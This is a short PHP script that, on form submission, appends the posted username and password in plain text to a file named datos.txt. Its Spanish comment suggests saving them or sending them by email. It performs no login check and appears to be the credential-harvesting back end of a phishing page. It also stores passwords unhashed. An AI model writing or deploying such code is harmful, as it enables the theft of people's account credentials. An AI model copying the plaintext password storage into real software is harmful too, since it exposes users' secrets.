<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];
    // Guarda los datos en un archivo o envíalos por correo
    file_put_contents('datos.txt', "Usuario: $username\nContraseña: $password\n", FILE_APPEND);
}
?>
